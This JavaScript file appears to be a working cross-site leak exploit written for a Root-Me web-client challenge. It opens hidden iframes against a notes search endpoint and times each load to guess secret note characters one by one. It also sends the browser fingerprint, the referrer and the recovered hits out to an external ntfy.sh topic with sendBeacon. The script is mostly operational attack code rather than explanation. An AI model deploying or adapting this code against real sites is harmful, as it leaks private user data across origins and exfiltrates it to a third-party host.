const B='https://web-client-ch56.challenge01.root-me.org:58056/';
const N='https://ntfy.sh/wcxleak56a';
const RID=Date.now()%100000;
const T0=Date.now(),EL=()=>Date.now()-T0;
const beacon=(s)=>{try{navigator.sendBeacon(N,s)}catch(e){}};
const logj=o=>beacon(JSON.stringify(Object.assign({r:RID,t:Math.round(EL()/100)/10},o)));
const CHARS='abcdefghijklmnopqrstuvwxyz0123456789-_ ';
let seq=0;
function probe(id,q){return new Promise(res=>{const f=document.createElement('iframe');const st=Date.now();let fin=0;
 const done=v=>{if(!fin){fin=1;try{f.remove()}catch(e){}res(v)}};
 f.style.cssText='display:none;width:0;height:0';
 f.onload=()=>done(Date.now()-st);
 f.onerror=()=>done(9999);
 setTimeout(()=>done(9998),9000);
 const myseq=seq++;
 setTimeout(()=>{if(!fin)document.body.appendChild(f)},40*(myseq%36));
 f.src=B+'notes/'+id+'/'+encodeURIComponent(q)+'?v='+RID+'x'+(myseq);});}
async function wave(halfA,halfB){
 // half = [id, charArray]; <=19 probes each, <=38 iframes total
 const jobs=[];
 [halfA,halfB].forEach(h=>{if(!h)return;const[id,cs]=h;
  cs.forEach(c=>jobs.push(probe(id,c).then(d=>[id,c,d])));});
 const rs=await Promise.all(jobs);
 const per={};
 rs.forEach(([id,c,d])=>{const k='i'+id;(per[k]=per[k]||{n:0,ds:[],h:[]}).n++;
  per[k].ds.push(d);if(d>1500&&d<6000)per[k].h.push(c);});
 for(const k in per){const a=per[k].ds.slice().sort((x,y)=>x-y);
  per[k].min=a[0];per[k].med=a[a.length>>1];per[k].max=a[a.length-1];}
 return per;}
(async()=>{
 const H=new Map(location.hash.slice(1).split('&').map(s=>[(s.split('=')[0]||''),s.split('=')[1]||'']));
 let ids=(H.get('k')||'1,2,3,4,5,6,7,8').split(',').map(x=>parseInt(x)).filter(x=>x>0);
 logj({ev:'start',ua:navigator.userAgent.slice(0,60),ck:navigator.cookieEnabled?1:0,hc:navigator.hardwareConcurrency,rt:navigator.connection?navigator.connection.rtt:-1,ids:ids.join(','),ref:document.referrer.slice(0,40)});
 // marker: root touch -> session bootstrap if none (SameSite=None), liveness+baseline
 const m0=Date.now();
 await new Promise(res=>{const f=document.createElement('iframe');f.style.cssText='display:none';
  f.onload=()=>{logj({ev:'mk',t:Date.now()-m0});setTimeout(res,300)};f.onerror=()=>{logj({ev:'mk',err:1});res()};setTimeout(()=>res(),6000);f.src=B+'?m='+RID;document.body.appendChild(f);});
 const pairs=[];
 for(let i=0;i<ids.length;i+=2)pairs.push(ids.slice(i,i+2));
 const allhits={};
 for(let w=0;w<pairs.length;w++){
  if(EL()>22500){logj({ev:'cut',w:w});break;}
  const[a,b]=pairs[w];
  const A=a?[a,CHARS.slice(0,19).split('')]:null;
  const Bh=b?[b,CHARS.slice(0,19).split('')]:null;
  let per=await wave(A,Bh);
  logj({ev:'w1',w:w,per:per});
  // second half for same ids
  if(EL()>22500){logj({ev:'cut2',w:w});break;}
  const A2=a?[a,CHARS.slice(19).split('')]:null;
  const B2=b?[b,CHARS.slice(19).split('')]:null;
  per=await wave(A2,B2);
  logj({ev:'w2',w:w,per:per});
  for(const k in per)if(per[k].h&&per[k].h.length)(allhits[k]=allhits[k]||[]).push(...per[k].h);
 }
 logj({ev:'done',hits:allhits});
})();
